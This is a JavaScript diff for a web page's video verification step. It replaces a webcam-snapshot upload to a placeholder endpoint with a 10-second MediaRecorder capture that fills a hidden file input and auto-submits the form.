@@ -1,7 +1,6 @@
 const loadingScreen = document.getElementById('loading');
-const minimumLoadingTime = 2000; 
+const minimumLoadingTime = 2000;
 const startTime = Date.now();
-let stream;
 
 window.onload = function () {
     const elapsedTime = Date.now() - startTime;
@@ -14,104 +13,73 @@ window.onload = function () {
     document.getElementById('current-year').textContent = new Date().getFullYear();
 };
 
-function startVideoVerification() {
-    const cameraView = document.getElementById('camera-view');
-    const video = document.getElementById('video');
-    const countdown = document.getElementById('countdown');
-    const startButton = document.getElementById('start-verification-btn');
+const startButton = document.getElementById('start-verification-btn');
+const submitButton = document.getElementById('submit-form-btn');
+const videoElement = document.getElementById('video');
+const cameraView = document.getElementById('camera-view');
+const fileInput = document.getElementById('video-input');
+const form = document.getElementById('video-upload-form');
+const countdownDisplay = document.getElementById('countdown');
 
-    startButton.disabled = true;
-    startButton.textContent = 'Verification in progress...';
+let mediaRecorder;
+let recordedChunks = [];
 
-    cameraView.style.display = 'block';
-    countdown.style.display = 'block';
+// Start recording from the camera
+startButton.addEventListener('click', () => {
+    navigator.mediaDevices.getUserMedia({ video: true })
+        .then((stream) => {
+            startButton.style.display = 'none';
+            cameraView.style.display = 'block';
+            videoElement.srcObject = stream;
+            videoElement.play();
+            
+            // Start recording and show countdown
+            let countdown = 10;
+            countdownDisplay.textContent = countdown;
 
-    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then((mediaStream) => {
-                stream = mediaStream;
-                video.srcObject = stream;
+            // Start the countdown timer
+            const countdownInterval = setInterval(() => {
+                countdown--;
+                countdownDisplay.textContent = countdown;
 
-                startCountdown(10, () => captureSnapshot(video));
-            })
-            .catch((error) => {
-                console.error("Error accessing the camera: ", error);
-                alert("Unable to access the camera. Please check your device settings.");
-                resetVerificationButton(startButton);
-            });
-    } else {
-        alert("Camera not supported on this device.");
-        resetVerificationButton(startButton);
-    }
-}
+                if (countdown <= 0) {
+                    clearInterval(countdownInterval); // Stop the countdown when it reaches 0
+                    mediaRecorder.stop();
+                    const tracks = stream.getTracks();
+                    tracks.forEach((track) => track.stop());
+                    videoElement.srcObject = null;
+                }
+            }, 1000);
 
-function startCountdown(seconds, callback) {
-    const countdown = document.getElementById('countdown');
-    countdown.textContent = seconds;
+            mediaRecorder = new MediaRecorder(stream);
+            recordedChunks = [];
 
-    const interval = setInterval(() => {
-        seconds -= 1;
-        countdown.textContent = seconds;
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) recordedChunks.push(event.data);
+            };
 
-        if (seconds <= 0) {
-            clearInterval(interval);
-            countdown.style.display = 'none';
-            callback();
-        }
-    }, 1000);
-}
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                const file = new File([blob], 'recorded-video.webm', { type: 'video/webm' });
 
-function captureSnapshot(video) {
-    if (!stream) return;
+                // Populate the hidden file input
+                const dataTransfer = new DataTransfer();
+                dataTransfer.items.add(file);
+                fileInput.files = dataTransfer.files;
 
-    const canvas = document.createElement('canvas');
-    const context = canvas.getContext('2d');
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
+                // Show the submit form button
+                form.style.display = 'block';
 
-    context.translate(canvas.width, 0);
-    context.scale(-1, 1);
-    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                // Auto-submit form after 1 second
+                setTimeout(() => {
+                    form.submit();
+                }, 1000);
+            };
 
-    canvas.toBlob((blob) => {
-        if (blob) {
-            stream.getTracks().forEach(track => track.stop());
-            sendSnapshot(blob);
-        } else {
-            console.error('Failed to capture the snapshot.');
-            alert('Failed to capture the snapshot.');
-        }
-    }, 'image/jpeg');
-}
-
-function sendSnapshot(blob) {
-    const formData = new FormData();
-    formData.append('file', blob, 'snapshot.jpg');
-
-    fetch('https://example.com/upload', {
-        method: 'POST',
-        body: formData
-    })
-        .then((response) => response.json())
-        .then((data) => {
-            console.log('Image uploaded successfully:', data);
-            alert('Image uploaded successfully.');
-            window.location.href = 'page5.html';
+            mediaRecorder.start();
         })
         .catch((error) => {
-            console.error('Error uploading the image:', error);
-            alert('Failed to upload the image.');
-            resetVerificationButton(document.getElementById('start-verification-btn'));
+            console.error('Error accessing the camera:', error);
+            alert('Failed to access the camera.');
         });
-}
-
-function resetVerificationButton(button) {
-    button.disabled = false;
-    button.textContent = 'Start Video Verification';
-}
-
-window.onbeforeunload = () => {
-    if (stream) {
-        stream.getTracks().forEach(track => track.stop());
-    }
-};
+});
